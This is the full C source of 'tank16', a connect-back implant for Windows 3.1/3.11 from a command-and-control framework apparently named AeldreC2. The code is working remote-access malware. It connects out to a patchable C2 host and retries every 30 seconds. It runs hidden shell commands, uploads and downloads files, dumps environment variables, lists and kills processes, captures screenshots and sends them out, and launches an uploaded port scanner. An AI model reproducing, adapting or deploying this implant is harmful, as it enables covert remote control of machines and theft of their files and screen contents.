/*
 * tank16.c  --  AeldreC2 Tank Program (Win16 / WFW 3.11)
 *
 * Stripped-down connect-back implant for Windows 3.1/3.11 without Win32s.
 * Uses 16-bit Winsock (winsock.dll), WinExec+temp file for command output,
 * and _dos_find* / _l* file I/O from <dos.h> and <io.h>.
 *
 * CLU patchable config block at g_clu (magic "AELDRECLU0001").
 *
 * Build:
 *   wcc -ms -bt=windows -zu -s tank16.c
 *   wlink system windows name tank16.exe file tank16.obj library winsock.lib
 *
 * Winsock 1.1 declarations are inlined here; winsock.h for Win16 may differ
 * from the Win32 version.
 */

#include <windows.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <dos.h>
#include <io.h>

/* Win16 headers don't define MAX_PATH */
#ifndef MAX_PATH
#define MAX_PATH 260
#endif

/* ----------------------------------------------------------------
 * Inline Win16 Winsock 1.1 declarations (avoid header conflicts)
 * ---------------------------------------------------------------- */
#define WINSOCK_API  PASCAL
typedef unsigned int SOCKET;
#define INVALID_SOCKET  ((SOCKET)(~0))
#define SOCKET_ERROR    (-1)
#define AF_INET         2
#define SOCK_STREAM     1
#define IPPROTO_TCP     6
#define SOL_SOCKET      0xFFFF
#define SO_REUSEADDR    0x0004

typedef struct {
    unsigned char  s_b1, s_b2, s_b3, s_b4;
} W16_IN_ADDR;

typedef struct {
    short          sin_family;
    unsigned short sin_port;
    W16_IN_ADDR    sin_addr;
    char           sin_zero[8];
} W16_SOCKADDR_IN;

typedef struct {
    char   *h_name;
    char  **h_aliases;
    short   h_addrtype;
    short   h_length;
    char  **h_addr_list;
} W16_HOSTENT;
#define h_addr h_addr_list[0]

typedef struct {
    unsigned char  opcode;
    unsigned char  pstrlen;
    unsigned short version;
    unsigned short maxsockets;
    unsigned short maxudp;
    char          *vendor_info;
} W16_WSADATA;

typedef unsigned long (*pfn_htonl)(unsigned long);
typedef unsigned short (*pfn_htons)(unsigned short);
typedef SOCKET (*pfn_socket)(int, int, int);
typedef int (*pfn_connect)(SOCKET, void *, int);
typedef int (*pfn_send)(SOCKET, const char *, int, int);
typedef int (*pfn_recv)(SOCKET, char *, int, int);
typedef int (*pfn_closesocket)(SOCKET);
typedef W16_HOSTENT * (*pfn_gethostbyname)(const char *);
typedef int (*pfn_WSAStartup)(unsigned short, W16_WSADATA *);
typedef int (*pfn_WSACleanup)(void);
typedef int (*pfn_WSAGetLastError)(void);
typedef int (*pfn_gethostname)(char *, int);

static HINSTANCE         g_hinst     = NULL;  /* stored in WinMain for GetModuleFileName */
static HINSTANCE         g_wsock     = NULL;
static pfn_htonl         w_htonl     = NULL;
static pfn_htons         w_htons     = NULL;
static pfn_socket        w_socket    = NULL;
static pfn_connect       w_connect   = NULL;
static pfn_send          w_send      = NULL;
static pfn_recv          w_recv      = NULL;
static pfn_closesocket   w_closesock = NULL;
static pfn_gethostbyname w_gethostby = NULL;
static pfn_WSAStartup    w_startup   = NULL;
static pfn_WSACleanup    w_cleanup   = NULL;
static pfn_WSAGetLastError w_lasterr   = NULL;
static pfn_gethostname     w_hostname  = NULL;  /* optional — not all stacks expose it */

/* ----------------------------------------------------------------
 * CLU patchable config block
 * ---------------------------------------------------------------- */
#define TANK16_STR_(x) #x
#define TANK16_STR(x)  TANK16_STR_(x)

#ifndef TANK_C2_HOST
#define TANK_C2_HOST 127.0.0.1
#endif
#ifndef TANK_C2_PORT
#define TANK_C2_PORT 4444
#endif
#ifndef TANK_C2_KEY
#define TANK_C2_KEY  00000000
#endif

#pragma pack(1)
static struct {
    char           magic[14];   /* "AELDRECLU0001" */
    char           host[64];
    unsigned short port;
    unsigned char  tls;         /* ignored on Win16 — no Schannel */
    char           key[9];      /* 8 hex chars + NUL — must match Joshua server key */
} g_clu = {
    "AELDRECLU0001",
    TANK16_STR(TANK_C2_HOST),
    TANK_C2_PORT,
    0,
    TANK16_STR(TANK_C2_KEY)
};
#pragma pack()

#define RETRY_MS 30000UL

/* ----------------------------------------------------------------
 * TOOLHELP.DLL types and loader (Win 3.1 standard)
 * ---------------------------------------------------------------- */
typedef struct {
    DWORD     dwSize;
    HTASK     hTask;
    HTASK     hTaskParent;
    HINSTANCE hInst;
    HMODULE   hModule;
    WORD      wSS, wSP, wStackTop, wStackMinimum, wStackBottom;
    WORD      wcEvents;
    HGLOBAL   hQueue;
    char      szModule[9];   /* 8-char module name + NUL */
    WORD      wPSPOffset;
    HFILE     hNext;
} TH_TASKENTRY;

typedef BOOL (FAR PASCAL *pfnTaskFirst)(TH_TASKENTRY FAR *);
typedef BOOL (FAR PASCAL *pfnTaskNext)(TH_TASKENTRY FAR *);
typedef BOOL (FAR PASCAL *pfnTermApp)(HTASK, WORD);
#define TH_UAF_ABORT 2

static HINSTANCE   g_toolhelp  = NULL;
static pfnTaskFirst th_first    = NULL;
static pfnTaskNext  th_next     = NULL;
static pfnTermApp   th_term     = NULL;

static void toolhelp_load(void)
{
    g_toolhelp = LoadLibrary("TOOLHELP.DLL");
    if (!g_toolhelp || (unsigned int)g_toolhelp < 32) { g_toolhelp = NULL; return; }
    th_first = (pfnTaskFirst)GetProcAddress(g_toolhelp, "TaskFirst");
    th_next  = (pfnTaskNext) GetProcAddress(g_toolhelp, "TaskNext");
    th_term  = (pfnTermApp)  GetProcAddress(g_toolhelp, "TerminateApp");
    if (!th_first || !th_next || !th_term) {
        FreeLibrary(g_toolhelp); g_toolhelp = NULL;
    }
}

/* ----------------------------------------------------------------
 * Winsock loader
 * ---------------------------------------------------------------- */
static int winsock_load(void)
{
    W16_WSADATA wsd;
    g_wsock = LoadLibrary("WINSOCK.DLL");
    if (!g_wsock || (unsigned int)g_wsock < 32) return 0;
#define GF(v,n) v = (void*)GetProcAddress(g_wsock, n); if (!v) return 0;
    GF(w_htonl,    "htonl")
    GF(w_htons,    "htons")
    GF(w_socket,   "socket")
    GF(w_connect,  "connect")
    GF(w_send,     "send")
    GF(w_recv,     "recv")
    GF(w_closesock,"closesocket")
    GF(w_gethostby,"gethostbyname")
    GF(w_startup,  "WSAStartup")
    GF(w_cleanup,  "WSACleanup")
    GF(w_lasterr,  "WSAGetLastError")
#undef GF
    if (w_startup(0x0101, &wsd) != 0) return 0;
    /* gethostname is optional — present in most Winsock 1.1 stacks */
    w_hostname = (pfn_gethostname)GetProcAddress(g_wsock, "gethostname");
    return 1;
}

/* ----------------------------------------------------------------
 * Sleep with PeekMessage pump (Win16 cooperative multitasking)
 * ---------------------------------------------------------------- */
static void win16_sleep_ms(unsigned long ms)
{
    unsigned long t0 = GetTickCount();
    MSG msg;
    while ((GetTickCount() - t0) < ms) {
        if (PeekMessage(&msg, NULL, 0, 0, PM_REMOVE)) {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
    }
}

/* ----------------------------------------------------------------
 * Network helpers
 * ---------------------------------------------------------------- */
static int send_str(SOCKET s, const char *str)
{
    int len = lstrlen(str);
    return w_send(s, str, len, 0);
}

static int recv_line(SOCKET s, char *buf, int bufsz)
{
    int  i = 0;
    char c;
    while (i < bufsz - 1) {
        int n = w_recv(s, &c, 1, 0);
        if (n <= 0) return -1;
        if (c == '\r') continue;
        buf[i++] = c;
        if (c == '\n') break;
    }
    buf[i] = '\0';
    return i;
}

static int recv_exact(SOCKET s, char *buf, unsigned long len)
{
    unsigned long got = 0;
    while (got < len) {
        int n = w_recv(s, buf + got, (int)(len - got < 4096 ? len - got : 4096), 0);
        if (n <= 0) return -1;
        got += (unsigned long)n;
    }
    return 0;
}

/* ----------------------------------------------------------------
 * Commands
 * ---------------------------------------------------------------- */
static void cmd_sysinfo(SOCKET s)
{
    char buf[256];
    unsigned int ver = GetVersion();
    unsigned int major = ver & 0xFF;
    unsigned int minor = (ver >> 8) & 0xFF;
    DWORD free_kb;

    sprintf(buf, "Windows %u.%u\r\n", major, minor);
    send_str(s, buf);

    free_kb = GetFreeSpace(0) / 1024UL;
    sprintf(buf, "Free memory: %lu KB\r\n", (unsigned long)free_kb);
    send_str(s, buf);

    /* Read ComputerName from SYSTEM.INI [Network] section */
    {
        char ini_path[MAX_PATH];
        char name[64];
        GetWindowsDirectory(ini_path, sizeof(ini_path));
        lstrcat(ini_path, "\\SYSTEM.INI");
        GetPrivateProfileString("Network", "ComputerName", "(unknown)",
                                name, sizeof(name), ini_path);
        sprintf(buf, "ComputerName: %s\r\n", name);
        send_str(s, buf);

        GetPrivateProfileString("Network", "UserName", "(unknown)",
                                name, sizeof(name), ini_path);
        sprintf(buf, "UserName: %s\r\n", name);
        send_str(s, buf);
    }
    send_str(s, "<<<DONE>>>\n");
}

static void cmd_ls(SOCKET s, const char *path)
{
    struct find_t ff;
    char   pat[MAX_PATH];
    char   line[MAX_PATH + 40];
    int    rc;

    if (path && *path)
        sprintf(pat, "%s\\*.*", path);
    else
        lstrcpy(pat, "*.*");

    rc = _dos_findfirst(pat, _A_NORMAL|_A_RDONLY|_A_HIDDEN|_A_SYSTEM|_A_SUBDIR, &ff);
    while (rc == 0) {
        if (ff.attrib & _A_SUBDIR)
            sprintf(line, "[DIR]  %s\r\n", ff.name);
        else
            sprintf(line, "       %-14s  %lu\r\n", ff.name, (unsigned long)ff.size);
        send_str(s, line);
        rc = _dos_findnext(&ff);
    }
    send_str(s, "<<<DONE>>>\n");
}

static void cmd_get(SOCKET s, const char *path)
{
    HFILE  hf;
    long   fsz;
    char   hdr[32];
    char   chunk[512];
    int    rd;

    hf = _lopen(path, OF_READ);
    if (hf == HFILE_ERROR) {
        send_str(s, "Error: cannot open file\r\n<<<DONE>>>\n");
        return;
    }
    fsz = _llseek(hf, 0, 2);
    _llseek(hf, 0, 0);
    sprintf(hdr, "FILE:%ld\n", fsz);
    send_str(s, hdr);

    while (fsz > 0) {
        int want = (int)(fsz < (long)sizeof(chunk) ? fsz : (long)sizeof(chunk));
        rd = _lread(hf, chunk, want);
        if (rd <= 0) break;
        w_send(s, chunk, rd, 0);
        fsz -= rd;
    }
    _lclose(hf);
    send_str(s, "<<<DONE>>>\n");
}

static void cmd_put(SOCKET s, const char *path)
{
    HFILE  hf;
    char   line[64];
    long   expected;
    long   got;
    char   chunk[512];

    send_str(s, "PUTREADY\n");
    if (recv_line(s, line, sizeof(line)) < 0) return;
    if (_fstrncmp(line, "PUTSIZE:", 8) != 0) return;
    expected = atol(line + 8);

    hf = _lcreat(path, 0);
    if (hf == HFILE_ERROR) {
        /* drain full upload before reporting error — partial drain would leave
         * bytes in the stream and corrupt the session command loop. */
        long drained = 0;
        while (drained < expected) {
            int want = (int)(expected - drained < (long)sizeof(chunk) ?
                             expected - drained : (long)sizeof(chunk));
            int n = w_recv(s, chunk, want, 0);
            if (n <= 0) return;
            drained += n;
        }
        send_str(s, "Error: cannot create file\r\n<<<DONE>>>\n");
        return;
    }
    got = 0;
    while (got < expected) {
        int want = (int)(expected - got < (long)sizeof(chunk) ?
                         expected - got : (long)sizeof(chunk));
        int n = w_recv(s, chunk, want, 0);
        if (n <= 0) break;
        _lwrite(hf, chunk, n);
        got += n;
    }
    _lclose(hf);
    send_str(s, "<<<DONE>>>\n");
}

/* ----------------------------------------------------------------
 * cmd_env16 — list environment variables via GetDOSEnvironment()
 * ---------------------------------------------------------------- */
static void cmd_env16(SOCKET s)
{
    LPSTR env = GetDOSEnvironment();
    char *p   = env;
    if (!p) { send_str(s, "env: not available\r\n<<<DONE>>>\n"); return; }
    while (*p) {
        int n = lstrlen(p);
        send_str(s, p); send_str(s, "\r\n");
        p += n + 1;
    }
    send_str(s, "<<<DONE>>>\n");
}

/* ----------------------------------------------------------------
 * cmd_ps16 — list running tasks via TOOLHELP.DLL
 * ---------------------------------------------------------------- */
static void cmd_ps16(SOCKET s)
{
    TH_TASKENTRY te;
    char line[64];
    if (!th_first) { send_str(s,"ps: TOOLHELP.DLL not available\r\n<<<DONE>>>\n"); return; }
    send_str(s," Task   Module\r\n------  --------\r\n");
    te.dwSize = sizeof(te);
    if (th_first(&te)) do {
        sprintf(line, "0x%04X  %s\r\n", (unsigned int)te.hTask, te.szModule);
        send_str(s, line);
    } while (th_next(&te));
    send_str(s, "<<<DONE>>>\n");
}

/* ----------------------------------------------------------------
 * cmd_kill16 — terminate a task by module name or 0xHHHH handle
 * ---------------------------------------------------------------- */
static void cmd_kill16(SOCKET s, const char *arg)
{
    TH_TASKENTRY te;
    char line[64];
    unsigned int target = 0;
    int found = 0;

    if (!arg||!*arg) { send_str(s,"kill: usage: kill <module|0xHHHH>\r\n<<<DONE>>>\n"); return; }
    if (!th_first||!th_term) { send_str(s,"kill: TOOLHELP.DLL not available\r\n<<<DONE>>>\n"); return; }
    if (arg[0]=='0'&&(arg[1]=='x'||arg[1]=='X'))
        target = (unsigned int)strtoul(arg+2, NULL, 16);

    te.dwSize = sizeof(te);
    if (th_first(&te)) do {
        int match = target ? ((unsigned int)te.hTask == target)
                           : (lstrcmpi(te.szModule, arg) == 0);
        if (match) {
            if (th_term(te.hTask, TH_UAF_ABORT))
                sprintf(line,"kill: terminated 0x%04X (%s)\r\n",(unsigned int)te.hTask,te.szModule);
            else
                sprintf(line,"kill: TerminateApp failed for 0x%04X\r\n",(unsigned int)te.hTask);
            send_str(s, line); found = 1; break;
        }
    } while (th_next(&te));
    if (!found) { sprintf(line,"kill: '%s' not found\r\n",arg); send_str(s,line); }
    send_str(s,"<<<DONE>>>\n");
}

/* ----------------------------------------------------------------
 * cmd_pinfo16 — detailed info for one task (module name or handle)
 * ---------------------------------------------------------------- */
static void cmd_pinfo16(SOCKET s, const char *arg)
{
    TH_TASKENTRY te;
    char line[128];
    unsigned int target = 0;
    int found = 0;

    if (!arg||!*arg) { send_str(s,"pinfo: usage: pinfo <module|0xHHHH>\r\n<<<DONE>>>\n"); return; }
    if (!th_first) { send_str(s,"pinfo: TOOLHELP.DLL not available\r\n<<<DONE>>>\n"); return; }
    if (arg[0]=='0'&&(arg[1]=='x'||arg[1]=='X'))
        target = (unsigned int)strtoul(arg+2, NULL, 16);

    te.dwSize = sizeof(te);
    if (th_first(&te)) do {
        int match = target ? ((unsigned int)te.hTask == target)
                           : (lstrcmpi(te.szModule, arg) == 0);
        if (match) {
            sprintf(line,
                "Task:    0x%04X\r\nParent:  0x%04X\r\nModule:  %s\r\nEvents:  %u\r\n",
                (unsigned int)te.hTask,(unsigned int)te.hTaskParent,
                te.szModule,(unsigned int)te.wcEvents);
            send_str(s,line); found=1; break;
        }
    } while (th_next(&te));
    if (!found) { sprintf(line,"pinfo: '%s' not found\r\n",arg); send_str(s,line); }
    send_str(s,"<<<DONE>>>\n");
}

/* ----------------------------------------------------------------
 * cmd_resolve16 — DNS lookup via Winsock gethostbyname
 * ---------------------------------------------------------------- */
static void cmd_resolve16(SOCKET s, const char *arg)
{
    W16_HOSTENT *he;
    char line[128];
    int  i;
    if (!arg||!*arg) { send_str(s,"resolve: usage: resolve <host>\r\n<<<DONE>>>\n"); return; }
    he = w_gethostby(arg);
    if (!he) {
        sprintf(line,"resolve: %s: not found\r\n",arg);
        send_str(s,line);
    } else {
        sprintf(line,"Name: %s\r\n",he->h_name); send_str(s,line);
        for (i=0; he->h_addr_list[i]; i++) {
            unsigned char *ip = (unsigned char *)he->h_addr_list[i];
            sprintf(line,"  %u.%u.%u.%u\r\n",ip[0],ip[1],ip[2],ip[3]);
            send_str(s,line);
        }
    }
    send_str(s,"<<<DONE>>>\n");
}

/* ----------------------------------------------------------------
 * cmd_ifconfig16 — network info from gethostname + gethostbyname
 * ---------------------------------------------------------------- */
static void cmd_ifconfig16(SOCKET s)
{
    char hname[64], line[128];
    W16_HOSTENT *he;
    int i;

    hname[0]='\0';
    if (w_hostname && w_hostname(hname,sizeof(hname))==0 && hname[0]) {
        sprintf(line,"Host: %s\r\n",hname); send_str(s,line);
    } else {
        /* fallback: read from SYSTEM.INI [Network] */
        char sysini[MAX_PATH];
        GetWindowsDirectory(sysini,sizeof(sysini));
        lstrcat(sysini,"\\SYSTEM.INI");
        GetPrivateProfileString("Network","ComputerName","(unknown)",
                                hname,sizeof(hname),sysini);
        sprintf(line,"Host: %s (SYSTEM.INI)\r\n",hname); send_str(s,line);
    }
    he = w_gethostby(hname);
    if (he) {
        for (i=0; he->h_addr_list[i]; i++) {
            unsigned char *ip=(unsigned char*)he->h_addr_list[i];
            sprintf(line,"  inet %u.%u.%u.%u\r\n",ip[0],ip[1],ip[2],ip[3]);
            send_str(s,line);
        }
    }
    send_str(s,"<<<DONE>>>\n");
}

/* ----------------------------------------------------------------
 * Execute a shell command, capture output to temp file, send result
 * ---------------------------------------------------------------- */
static void exec_command(SOCKET s, const char *cmd)
{
    char  tmpdir[MAX_PATH];
    char  tmpfile[MAX_PATH];
    char  cmdline[MAX_PATH + 64];
    HFILE hf;
    long  fsz;
    char  chunk[512];
    int   rd;
    UINT  htask;

    /* GetTempPath is Win32 only; use Windows dir (always writable on Win 3.11) */
    GetWindowsDirectory(tmpdir, sizeof(tmpdir));
    lstrcat(tmpdir, "\\");
    sprintf(tmpfile, "%sTK%04lX.OUT", tmpdir, (unsigned long)GetTickCount() & 0xFFFF);

    sprintf(cmdline, "COMMAND.COM /c %s > %s 2>&1", cmd, tmpfile);
    htask = WinExec(cmdline, SW_HIDE);
    if (htask < 32) {
        send_str(s, "Error: WinExec failed\r\n<<<DONE>>>\n");
        return;
    }

    /* Wait for child — poll until output size stops changing for 300 ms,
     * or the 15-second deadline expires.  win16_sleep_ms() yields between
     * polls so WFW cooperative multitasking is not starved. */
    {
        unsigned long deadline    = GetTickCount() + 15000UL;
        long          last_fsz    = -1;
        int           has_stable  = 0;
        unsigned long stable_since = 0;

        while (GetTickCount() < deadline) {
            hf = _lopen(tmpfile, OF_READ);
            if (hf != HFILE_ERROR) {
                fsz = _llseek(hf, 0, 2);
                _lclose(hf);
                if (fsz > 0 && fsz == last_fsz) {
                    if (!has_stable) {
                        has_stable   = 1;
                        stable_since = GetTickCount();
                    } else if (GetTickCount() - stable_since >= 300UL) {
                        break;  /* size unchanged for 300 ms — done */
                    }
                } else {
                    has_stable = 0;
                }
                last_fsz = fsz;
            }
            win16_sleep_ms(50);  /* yield + throttle poll rate */
        }
    }

    hf = _lopen(tmpfile, OF_READ);
    if (hf == HFILE_ERROR) {
        send_str(s, "<<<DONE>>>\n");
        return;
    }
    fsz = _llseek(hf, 0, 2);
    _llseek(hf, 0, 0);

    while (fsz > 0) {
        int want = (int)(fsz < (long)sizeof(chunk) ? fsz : (long)sizeof(chunk));
        rd = _lread(hf, chunk, want);
        if (rd <= 0) break;
        w_send(s, chunk, rd, 0);
        fsz -= rd;
    }
    _lclose(hf);
    unlink(tmpfile); /* ignore error if file didn't exist */
    send_str(s, "<<<DONE>>>\n");
}

/* ----------------------------------------------------------------
 * Session loop
 * ---------------------------------------------------------------- */
/* -----------------------------------------------------------------------
 * cmd_grid16: run GRID16.EXE from the same directory as tank16.exe,
 * capture its output via temp file and send back to Joshua.
 * Upload GRID16.EXE next to tank16.exe first via 'put'.
 * ----------------------------------------------------------------------- */
static void cmd_grid16(SOCKET s, const char *args)
{
    char tank_dir[MAX_PATH];
    char grid_path[MAX_PATH];
    char tmpdir[MAX_PATH];
    char tmpfile[MAX_PATH];
    char cmdline[MAX_PATH + 512];
    char *sl;
    HFILE hf;
    long  fsz;
    char  chunk[512];
    int   rd;
    unsigned long deadline;
    long  last_fsz    = -1;
    int   has_stable  = 0;
    unsigned long stable_since = 0;

    if (!args || !args[0]) {
        send_str(s, "grid: usage: grid <target> -p <ports> [-t ms] [-b] [-T n]\r\n"
                    "grid: (requires GRID16.EXE next to tank16.exe)\r\n<<<DONE>>>\n");
        return;
    }

    /* Locate GRID16.EXE in the same directory as tank16.exe */
    GetModuleFileName(g_hinst, tank_dir, sizeof(tank_dir));
    sl = strrchr(tank_dir, '\\');
    if (sl) { sl[1] = '\0'; } else { lstrcat(tank_dir, "\\"); }
    lstrcpy(grid_path, tank_dir);
    lstrcat(grid_path, "GRID16.EXE");

    hf = _lopen(grid_path, OF_READ);
    if (hf == HFILE_ERROR) {
        send_str(s, "grid: GRID16.EXE not found next to tank16.exe\r\n"
                    "grid: put GRID16.EXE to the tank directory first\r\n<<<DONE>>>\n");
        return;
    }
    _lclose(hf);

    /* Run via COMMAND.COM with output redirected to a temp file */
    GetWindowsDirectory(tmpdir, sizeof(tmpdir));
    lstrcat(tmpdir, "\\");
    sprintf(tmpfile, "%sGD%04X.OUT", tmpdir, (unsigned)(GetTickCount() & 0xFFFF));
    sprintf(cmdline, "COMMAND.COM /c \"%s\" %s -q > %s", grid_path, args, tmpfile);

    if (WinExec(cmdline, SW_HIDE) < 32) {
        send_str(s, "grid: WinExec failed\r\n<<<DONE>>>\n");
        return;
    }

    /* Wait for grid16 to finish — same stable-size approach as exec_command */
    deadline = GetTickCount() + 120000UL;  /* 2 minute max scan */
    while (GetTickCount() < deadline) {
        hf = _lopen(tmpfile, OF_READ);
        if (hf != HFILE_ERROR) {
            fsz = _llseek(hf, 0, 2);
            _lclose(hf);
            if (fsz > 0 && fsz == last_fsz) {
                if (!has_stable) { has_stable = 1; stable_since = GetTickCount(); }
                else if (GetTickCount() - stable_since >= 500UL) break;
            } else { has_stable = 0; }
            last_fsz = fsz;
        }
        win16_sleep_ms(200);
    }

    /* Read and stream the output */
    hf = _lopen(tmpfile, OF_READ);
    if (hf == HFILE_ERROR) { send_str(s, "<<<DONE>>>\n"); return; }
    fsz = _llseek(hf, 0, 2);
    _llseek(hf, 0, 0);
    while (fsz > 0) {
        int want = (int)(fsz < (long)sizeof(chunk) ? fsz : (long)sizeof(chunk));
        rd = _lread(hf, chunk, want);
        if (rd <= 0) break;
        w_send(s, chunk, rd, 0);
        fsz -= rd;
    }
    _lclose(hf);
    unlink(tmpfile);
    send_str(s, "<<<DONE>>>\n");
}

/* ----------------------------------------------------------------
 * cmd_screenshot16 -- Win16 GDI screen capture; sends 24bpp BMP over socket
 * ---------------------------------------------------------------- */
static void cmd_screenshot16(SOCKET s)
{
    int     w, h, row;
    HDC     hdcScr, hdcMem;
    HBITMAP hBmp;
    BITMAPINFOHEADER bih;
    BITMAPINFO       bmi;
    long    stride, pixel_bytes, total;
    HANDLE  hRowBuf;
    char FAR *rowbuf;
    char    hdr[48];
    /* Manually-packed 14-byte BITMAPFILEHEADER to avoid struct alignment issues */
    char    bfh_bytes[14];

    w = GetSystemMetrics(SM_CXSCREEN);
    h = GetSystemMetrics(SM_CYSCREEN);

    hdcScr = GetDC(NULL);
    if (!hdcScr) { send_str(s, "screenshot: GetDC failed\r\n<<<DONE>>>\n"); return; }
    hdcMem = CreateCompatibleDC(hdcScr);
    hBmp   = CreateCompatibleBitmap(hdcScr, w, h);
    if (!hdcMem || !hBmp) {
        if (hBmp)   DeleteObject(hBmp);
        if (hdcMem) DeleteDC(hdcMem);
        ReleaseDC(NULL, hdcScr);
        send_str(s, "screenshot: GDI alloc failed\r\n<<<DONE>>>\n"); return;
    }
    SelectObject(hdcMem, hBmp);
    BitBlt(hdcMem, 0, 0, w, h, hdcScr, 0, 0, SRCCOPY);
    ReleaseDC(NULL, hdcScr);

    /* 24bpp, positive biHeight = bottom-up (standard BMP) */
    memset(&bih, 0, sizeof(bih));
    bih.biSize        = sizeof(bih);
    bih.biWidth       = w;
    bih.biHeight      = h;
    bih.biPlanes      = 1;
    bih.biBitCount    = 24;
    bih.biCompression = BI_RGB;

    stride      = (long)(((long)w * 3L + 3L) & ~3L);
    pixel_bytes = stride * (long)h;
    total       = 14L + 40L + pixel_bytes;   /* bfh + bih + pixels */

    hRowBuf = GlobalAlloc(GMEM_MOVEABLE, (DWORD)stride);
    if (!hRowBuf) {
        DeleteObject(hBmp); DeleteDC(hdcMem);
        send_str(s, "screenshot: out of memory\r\n<<<DONE>>>\n"); return;
    }
    rowbuf = (char FAR *)GlobalLock(hRowBuf);

    /* Send FILE: header */
    sprintf(hdr, "FILE:%ld\n", total);
    send_str(s, hdr);

    /* Manually-packed BITMAPFILEHEADER (14 bytes, little-endian) */
    bfh_bytes[0] = 'B'; bfh_bytes[1] = 'M';
    bfh_bytes[2] = (char)(total & 0xFF);
    bfh_bytes[3] = (char)((total >> 8) & 0xFF);
    bfh_bytes[4] = (char)((total >> 16) & 0xFF);
    bfh_bytes[5] = (char)((total >> 24) & 0xFF);
    bfh_bytes[6] = bfh_bytes[7] = bfh_bytes[8] = bfh_bytes[9] = 0;
    bfh_bytes[10] = 54; bfh_bytes[11] = bfh_bytes[12] = bfh_bytes[13] = 0;
    w_send(s, bfh_bytes, 14, 0);

    /* BITMAPINFOHEADER (40 bytes) */
    w_send(s, (char FAR *)&bih, 40, 0);

    /* Pixel data — one row at a time, bottom-up order (rows 0..h-1) */
    memset(&bmi, 0, sizeof(bmi));
    bmi.bmiHeader = bih;
    bmi.bmiHeader.biSizeImage = (DWORD)pixel_bytes;
    for (row = 0; row < h; row++) {
        if (GetDIBits(hdcMem, hBmp, (UINT)row, 1,
                      (LPVOID)rowbuf, &bmi, DIB_RGB_COLORS) > 0)
            w_send(s, rowbuf, (int)stride, 0);
    }

    GlobalUnlock(hRowBuf);
    GlobalFree(hRowBuf);
    DeleteObject(hBmp);
    DeleteDC(hdcMem);
    send_str(s, "<<<DONE>>>\n");
}

static void run_session(SOCKET s)
{
    char line[512];

    /* Send banner */
    {
        char banner[256];
        char windir[MAX_PATH];
        char hostname[64];
        unsigned int ver = GetVersion();
        GetWindowsDirectory(windir, sizeof(windir));
        GetPrivateProfileString("Network", "ComputerName", "unknown",
                                hostname, sizeof(hostname), "SYSTEM.INI");
        sprintf(banner, "Tank/1 host=%s os=%u.%u shell=COMMAND.COM key=%.8s\n",
                hostname,
                ver & 0xFF, (ver >> 8) & 0xFF,
                g_clu.key);
        send_str(s, banner);
    }

    while (1) {
        if (recv_line(s, line, sizeof(line)) < 0) break;

        /* strip trailing whitespace */
        {
            int n = lstrlen(line);
            while (n > 0 && (line[n-1] == '\n' || line[n-1] == '\r' || line[n-1] == ' '))
                line[--n] = '\0';
        }

        if (line[0] == '\0') continue;

        if (lstrcmpi(line, "sysinfo") == 0) {
            cmd_sysinfo(s);
        } else if (_fstrncmp(line, "ls", 2) == 0 &&
                   (line[2] == ' ' || line[2] == '\0')) {
            cmd_ls(s, line[2] == ' ' ? line + 3 : "");
        } else if (_fstrncmp(line, "get ", 4) == 0) {
            cmd_get(s, line + 4);
        } else if (_fstrncmp(line, "put ", 4) == 0) {
            cmd_put(s, line + 4);
        } else if (lstrcmpi(line, "env") == 0) {
            cmd_env16(s);
        } else if (lstrcmpi(line, "ps") == 0) {
            cmd_ps16(s);
        } else if (_fstrncmp(line, "kill ", 5) == 0) {
            cmd_kill16(s, line + 5);
        } else if (_fstrncmp(line, "pinfo ", 6) == 0) {
            cmd_pinfo16(s, line + 6);
        } else if (_fstrncmp(line, "resolve ", 8) == 0) {
            cmd_resolve16(s, line + 8);
        } else if (lstrcmpi(line, "ifconfig") == 0) {
            cmd_ifconfig16(s);
        } else if (lstrcmpi(line, "netstat") == 0) {
            send_str(s, "netstat: not available on Win16\r\n<<<DONE>>>\n");
        } else if (lstrcmpi(line, "route") == 0) {
            send_str(s, "route: not available on Win16\r\n<<<DONE>>>\n");
        } else if (lstrcmpi(line, "screenshot") == 0) {
            cmd_screenshot16(s);
        } else if (_fstrncmp(line, "grid", 4) == 0 &&
                   (line[4] == ' ' || line[4] == '\0')) {
            cmd_grid16(s, line[4] == ' ' ? line + 5 : "");
        } else if (lstrcmpi(line, "exit") == 0 ||
                   lstrcmpi(line, "quit") == 0) {
            break;
        } else {
            exec_command(s, line);
        }
    }
}

/* ----------------------------------------------------------------
 * Connect to C2
 * ---------------------------------------------------------------- */
static SOCKET tank_connect(void)
{
    W16_HOSTENT    *he;
    W16_SOCKADDR_IN addr;
    SOCKET          s;

    he = w_gethostby(g_clu.host);
    if (!he) return INVALID_SOCKET;

    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port   = w_htons(g_clu.port);
    memcpy(&addr.sin_addr, he->h_addr, (size_t)he->h_length);

    s = w_socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (s == INVALID_SOCKET) return INVALID_SOCKET;

    if (w_connect(s, (void *)&addr, sizeof(addr)) == SOCKET_ERROR) {
        w_closesock(s);
        return INVALID_SOCKET;
    }
    return s;
}

/* ----------------------------------------------------------------
 * WinMain
 * ---------------------------------------------------------------- */
int PASCAL WinMain(HINSTANCE hInst, HINSTANCE hPrev,
                   LPSTR lpCmd, int nShow)
{
    (void)hPrev; (void)lpCmd; (void)nShow;
    g_hinst = hInst;

    if (!winsock_load()) return 0;
    toolhelp_load();   /* optional — ps/kill/pinfo unavailable if TOOLHELP.DLL absent */

    for (;;) {
        SOCKET s = tank_connect();
        if (s != INVALID_SOCKET) {
            run_session(s);
            w_closesock(s);
        }
        win16_sleep_ms(RETRY_MS);
    }

    /* unreachable */
    w_cleanup();
    FreeLibrary(g_wsock);
    return 0;
}
